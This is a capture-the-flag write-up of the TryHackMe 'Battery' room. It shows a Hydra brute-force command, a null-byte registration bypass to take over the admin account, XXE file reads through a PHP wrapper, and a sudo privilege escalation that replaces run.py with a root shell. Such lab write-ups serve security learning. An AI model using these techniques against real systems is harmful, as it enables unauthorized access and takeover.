## battery
*Electricity bill portal has been hacked many times in the past , so we have fired one of the employee from the security team , As a new recruit you need to work like a hacker to find the loop holes in the portal and gain root access to the server .*

This is [Battery](https://tryhackme.com/room/battery) from THM. It's medium rated.

## Ports
Just SSH and HTTP on their standard ports. The description pretty clearly shows it is the website we're interested in.

## HTTP
I'm liking dirsearch:

>root@kali:/opt/tryhackme/battery# cat /opt/dirsearch/reports/battery.thm/_21-01-15_20-41-52.txt  
200   663B   http://battery.thm:80/admin.php  
302   908B   http://battery.thm:80/dashboard.php    -> REDIRECTS TO: admin.php  
200     2KB  http://battery.thm:80/forms.php  
200   406B   http://battery.thm:80/index.html  
302     0B   http://battery.thm:80/logout.php    -> REDIRECTS TO: admin.php  
200   715B   http://battery.thm:80/register.php

So we have a webapp that we can register a user for and then login to. It is a payment portal that is partially implemented and it has a few functions that are for 'admins' only. Presumably this is where we need to get to.

The *report* page provides a binary; it's easily disassembled in Ghidra and provides a list of users:

>root@kali:/opt/tryhackme/battery# cat users  
support@bank.a  
contact@bank.a  
cyber@bank.a  
admins@bank.a  
sam@bank.a  
admin0@bank.a  
super_user@bank.a  
admin@bank.a  
control_admin@bank.a  
it_admin@bank.a  

Unfortunately it doesn't give us any (useful) passwords. I try a password attack on the login portal using Hydra:

``
hydra -L users -P /usr/share/wordlists/rockyou.txt battery.thm http-post-form "/admin.php:uname=^USER^&password=^PASS^&btn=Submit:S=302"
``

I don't run this too long, but it's getting nowhere. The binary does show that the user *admin@bank.a* has the ability to change passwords - maybe it's this particular used we need. In the meantime I decide *forms.php* is probably our target. I can see the content in Burp Suite but can't interact with it. The form submits an XML message, so perhaps the intended method is XXE injection. However, I still need to become admin to do anything useful.

I try messing about with adding a cookie with various flavours of *admin*, *isadmin=True* etc; nothing. I try **sqlmap** on various forms in the hope of dumping DB contents; nothing. I try to detect **nosql** injection; nada.

Next, I try registering a user using null bytes after the name:

>admin%00

This does successfully register a user, but it's still not the admin we want. You can't enter *admin@bank.a%00* into the registration form, because it is limited to 12 characters - just enough for the name *without* the null bytes.

At this point, I put it aside and do other things.

### Several days later
I check a hint - I was on the right track. We do want *admin@bank.a%00* - you just have to do it via Burp Suite to bypass the (JS) length restriction. I was so close!

After that, we have access to *acc.php* and *forms.php* which we didn't previously. No matter what is entered in *acc.php* you get a message about *RCE detected* and are logged out; this is a rabbit hole. Forms is what we want, and I'm sure it's XXE.

## XXE
It takes a bit to figure out, because it's not the simplest form of XXE. But it's [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe) to the rescue, with a PHP Wrapper inside XXE technique. Possibly others worked too, but this is what I used. Initially I read */etc/passwd*, then once I had the user names (*cyber* and *yash*) I looked for SSH keys; nope. Next I tried the code for the webapp, e.g.:

{% highlight html %}
POST /forms.php HTTP/1.1

{% endhighlight %}

This particular file contained hardcoded creds - score!
>//MY CREDS :- cyber:super#secure&password!  

## Privesc
Once we're on as *cyber*, we find:

{% highlight shell %}
cyber@ubuntu:~$ sudo -l
Matching Defaults entries for cyber on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
{% endhighlight %}

If we run this, it just prints out a message. We can't read it, since it's owned by root and we haven't been given permission. But that doesn't matter, because we can replace it:

{% highlight shell %}
cyber@ubuntu:~$ rm run.py
rm: remove write-protected regular file ‘run.py’? y
# make my own
root@ubuntu:~# cat run.py 
import os
os.system("echo pwn")
os.system("/bin/bash")
cyber@ubuntu:~$ sudo -u root /usr/bin/python3 /home/cyber/run.py
pwn
root@ubuntu:~# cd /root
root@ubuntu:~# id;hostname
uid=0(root) gid=0(root) groups=0(root)
ubuntu
{% endhighlight %}

And we are done.
